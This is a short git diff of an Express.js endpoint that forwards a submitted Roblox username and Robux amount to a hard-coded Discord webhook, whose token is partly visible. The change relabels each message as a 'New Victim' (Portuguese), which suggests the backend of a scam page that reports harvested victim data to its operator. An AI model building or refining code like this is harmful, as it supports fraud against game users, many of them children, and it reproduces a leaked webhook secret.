@@ -9,18 +9,16 @@ const WEBHOOK_URL = 'https://discord.com/api/webhooks/1395175802638700655/M1-Tjc
 app.post('/api/enviar', async (req, res) => {
   const { nick, robux } = req.body;
 
-  // Validação básica
   if (!nick || !robux) {
     return res.status(400).send("Dados inválidos");
   }
 
-  // Envia para o Discord com segurança
   try {
     await fetch(WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        content: `🎮 Nick: **${nick}**\n💰 Robux: **${robux}**`
+        content: `Nova Vítima 👤\nNick: ${nick}\n💸 Quantidade de Robux: ${robux}`
       })
     });
     res.status(200).send("Enviado com sucesso");
